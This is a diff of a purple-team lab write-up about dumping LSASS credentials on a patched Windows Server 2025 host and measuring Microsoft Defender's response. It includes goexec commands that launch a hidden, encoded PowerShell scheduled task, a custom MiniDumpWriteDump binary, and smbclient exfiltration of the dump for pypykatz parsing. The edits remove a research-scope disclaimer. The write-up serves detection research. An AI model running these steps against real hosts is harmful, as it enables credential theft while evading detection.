@@ -8,14 +8,6 @@
 
 ---
 
-## Research Scope
-
-This writeup focuses on detection engineering and Microsoft Defender telemetry behaviour, not tool development.
-The technique is described at the API level using publicly documented Windows functionality. No tooling or compiled binaries are provided.
-No vulnerability or security boundary bypass was identified. This research examines how Defender responds to specific credential access patterns and where visibility diverges from enforcement.
-The goal is to clarify detection boundaries for defenders.
-
-
 ## Objective
 
 Determine whether pypykatz can successfully parse an LSASS minidump exfiltrated from a fully patched Windows Server 2025 host at UBR 1742, with current Defender signatures active and no Credential Guard configured.
@@ -43,13 +35,13 @@ This is a **baseline test** — telemetry and detection rule validation are out 
 
 ### 1. Dump Delivery — Scheduled Task via goexec (tsch)
 
-A base64-encoded PowerShell payload was delivered via `goexec` using the Task Scheduler (`tsch`) module. The payload executed `curio.exe` — a compiled binary calling `MiniDumpWriteDump` directly via `dbghelp.dll` — against the LSASS process, writing output to `C:\Windows\Temp\out2.dmp`. This bypasses the `comsvcs.dll MiniDump` invocation path entirely, avoiding the CmdLine signature layer.
+A base64-encoded PowerShell payload was delivered via `goexec` using the Task Scheduler (`tsch`) module. The payload executed `curio.exe` — a compiled binary calling `MiniDumpWriteDump` directly via `dbghelp.dll` — against the LSASS process, writing output to `C:\Windows\Temp\out2.dmp`. The `comsvcs.dll`/`rundll32` invocation path was not used — it is blocked by Defender at process creation and was not attempted.
 
 ```bash
 # [Kali]
 ./goexec tsch create 192.168.1.52 \
   -u 'ubuntu' \
-  -p 'xxx****' \
+  -p 'j44****' \
   --task '\systemshell' \
   --exec 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' \
   --args "-NoP -NonI -W Hidden -Enc $ENCODED"
@@ -61,7 +53,7 @@ The task was configured to self-delete after execution. Dump completed in approx
 
 ```bash
 # [Kali]
-smbclient //192.168.1.52/C$ -U 'ubuntu%xxx****' \
+smbclient //192.168.1.52/C$ -U 'ubuntu%j44****' \
   -c 'get Windows\Temp\out2.dmp /tmp/out290425_SERVER_2025PATCHED_UBR_1742.dmp'
 ```
 
@@ -123,7 +115,7 @@ No domain — WORKGROUP host. No TGTs or service tickets in LSASS. Expected.
 ## Key Observations
 
 ### What worked
-- `curio.exe` (`MiniDumpWriteDump` via `dbghelp.dll`) via scheduled task delivery succeeded against Server 2025 at UBR 1742 with current Defender signatures — bypassing the `comsvcs MiniDump` CmdLine signature layer entirely
+- `curio.exe` (`MiniDumpWriteDump` via `dbghelp.dll`) via scheduled task delivery succeeded against Server 2025 at UBR 1742 with current Defender signatures
 - No observable structural changes in LSASS memory (MSV/DPAPI providers) impacted parsing on Server 2025 UBR 1742. pypykatz parsed the dump without issue.
 - SMB exfiltration of a 53 MB dump is trivially fast on a LAN segment
 
@@ -182,9 +174,7 @@ Event IDs **1116** (threat detected), **1117** (action taken), **1006/1007** (sc
 
 ### Notable: RTP pass-through at dump completion
 
-EID 3002 fired at **10:00:58 AM** — the exact minute the dump completed writing. The RTP filter driver briefly entered pass-through mode, meaning on-access scanning was suspended. This condition was not intentionally introduced and is attributed to earlier service disruption in the lab environment. It is worth noting regardless: even if Defender held a behavioural signature for `MiniDumpWriteDump` activity, the RTP engine was momentarily blind at the precise moment the dump file reached its final size.
-
-This condition was not intentionally introduced and is attributed to earlier service disruption in the lab environment. In this run, RTP was not active at the exact moment of dump completion. A clean run with uninterrupted RTP is required to fully validate detection coverage.
+EID 3002 fired at **10:00:58 AM** — the exact minute the dump completed writing. The RTP filter driver briefly entered pass-through mode, meaning on-access scanning was suspended. This condition was not intentionally introduced and is attributed to earlier service disruption in the lab environment. It is worth noting regardless: even if Defender held a behavioural signature for `MiniDumpWriteDump` activity, the RTP engine was momentarily blind at the precise moment the dump file reached its final size. A clean run with uninterrupted RTP is required to fully validate detection coverage.
 
 **Conclusion: No Defender detections were observed for this technique under the tested conditions (signature 1.449.353.0, Server 2025 UBR 1742) — even when RTP was active during most of the execution window.**
 
@@ -212,16 +202,7 @@ This condition was not intentionally introduced and is attributed to earlier ser
 
 *Part of the [AD-Lab-Research](https://github.com/osherjacobs/AD-Lab-Research) series — purple team attack chains with paired detection engineering.*
 
-## References
-
-- [pypykatz](https://github.com/skelsec/pypykatz)
-- [goexec](https://github.com/bachimanchi/goexec)
-- [Microsoft — Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)
-- [Microsoft — RunAsPPL](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
-
----
-
-*Part of the [AD-Lab-Research](https://github.com/osherjacobs/AD-Lab-Research) series — purple team attack chains with paired detection engineering.*
+--- 
 
 Screenshots:
 
